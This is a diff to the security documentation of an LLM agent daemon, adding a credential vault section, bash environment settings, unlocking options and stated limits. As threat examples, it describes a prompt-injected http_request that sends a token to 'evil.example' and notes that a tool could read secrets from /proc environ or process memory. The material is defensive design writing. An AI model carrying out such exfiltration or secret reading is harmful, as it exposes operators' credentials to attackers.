@@ -14,10 +14,92 @@ Recommendations
 
 - Disable ``tools.python_exec`` unless you need it.
 - Disable ``tools.bash`` unless you need direct shell access.
+- Keep ``tools.bash.pass_parent_env = false`` (the default). Setting it to ``true`` makes every
+  variable the daemon runs with — including any ``${ENV_VAR}`` secret used in ``config.toml`` —
+  readable with a single ``env`` call. Add the specific keys a command needs to ``env_allowlist``
+  instead.
 - Keep ``tools.apply_patch.restrict_to_workspace = true`` unless unrestricted edits are required.
 - Keep ``tools.file_storage.allow_outside_root = false`` to prevent path traversal.
 - Prefer explicit sandbox isolation for untrusted code (``sandbox_mode``: ``none``, ``basic``, ``rlimit``, ``cgroup``, or ``jail``; default is ``basic``).
 - Run the daemon as a non-privileged user; mount only the data directory in Docker.
+- Store credentials in the ``[vault]`` rather than in ``config.toml`` or the process environment.
+
+Credential vault
+----------------
+
+The vault keeps credentials encrypted at rest (AES-256-GCM, key derived from a password with
+scrypt) and out of the LLM's reach. Enable it with ``[vault] enabled = true`` after installing
+the ``vault`` extra, and write secrets with ``minibot vault edit`` (see :doc:`cli`).
+
+Secrets are **destination-bound**. An administrator binds a secret to one consumer in
+configuration and that consumer resolves it itself:
+
+.. code-block:: toml
+
+   [[tools.mcp.servers]]
+   name = "github"
+   transport = "http"
+   url = "https://api.githubcopilot.com/mcp/"
+   auth_secret = "github"
+
+``${secret:NAME}`` is the general form: it works in any string value in ``config.toml``, so provider
+API keys, the Telegram bot token, and any other credential can live in the vault instead of in the
+file. This is worth doing precisely because ``bash`` can read ``config.toml`` and cannot read the
+vault:
+
+.. code-block:: toml
+
+   [providers.openai]
+   api_key = "${secret:OPENAI_API_KEY}"
+
+See :doc:`config` for the resolution rules. Note the boundary: this protects the credential at rest
+in the file. Once resolved it sits in the daemon's memory exactly as an ``${ENV_VAR}`` value does,
+so the process-memory limits below apply to both equally.
+
+The model's only vault-related capability is ``list_secrets``, which returns names. There is no
+``get_secret`` tool and no ``secret://`` reference the model can write into a tool argument — that
+would turn the vault into a decryption oracle, letting a prompt-injected
+``http_request(url="https://evil.example", headers={...})`` exfiltrate a token to an
+attacker-chosen destination without the model ever seeing its value.
+
+Unlocking
+~~~~~~~~~
+
+The password is read from ``[vault] password_file``, else ``MINIBOT_VAULT_PASSWORD``, else an
+interactive prompt at startup. **The prompt is the recommended method**: it is the only one where
+no password material touches disk or the process environment. After unlocking, only the decrypted
+map is retained — never the password or the derived key.
+
+The other two are supported for unattended deployments, but both are readable by the ``bash``
+tool, which runs as the same OS user:
+
+- ``password_file`` — ``bash`` has no filesystem jail, so it can simply read the file.
+- ``MINIBOT_VAULT_PASSWORD`` — ``bash`` does not *inherit* it (``pass_parent_env`` defaults to
+  false), but it can read it out of ``/proc/<daemon-pid>/environ``, which holds the environment
+  the daemon was started with. Clearing the variable inside the process does not change that
+  snapshot.
+
+Whichever you choose, that file or variable becomes the thing to protect instead of the vault.
+
+The vault file is excluded from git and the Docker build context by default (``*.vault.yml``).
+
+Limits
+~~~~~~
+
+- **This protects secrets at rest and from the LLM's own tool calls.** It does not protect against
+  a fully compromised daemon process reading its own memory (``/proc/<pid>/mem``) — the same trust
+  boundary as any self-hosted secret manager running as one OS user.
+- Whether a tool process can read the *daemon's* memory depends on the host's
+  ``kernel.yama.ptrace_scope``. At ``1`` (the common desktop default) it cannot: ``bash`` is a
+  descendant of the daemon, not an ancestor, so the attach is refused. At ``0`` — frequently the
+  case inside containers — any same-user process can read that memory, and the unlocked secrets
+  with it. Check ``cat /proc/sys/kernel/yama/ptrace_scope`` on the host you actually deploy to.
+- No rotation, no recovery, no hot-reload: a forgotten password means starting over, and editing
+  the vault while the daemon runs needs a restart to take effect.
+- ``${ENV_VAR}`` config secrets (``token_env``, static MCP headers) are a separate, older
+  mechanism and are unaffected. The two coexist.
+- Task workers get no vault: they load no bundled extensions and build their own tool set, so no
+  vault-backed credential exists in a worker process.
 
 Jail Mode (Firejail)
 --------------------
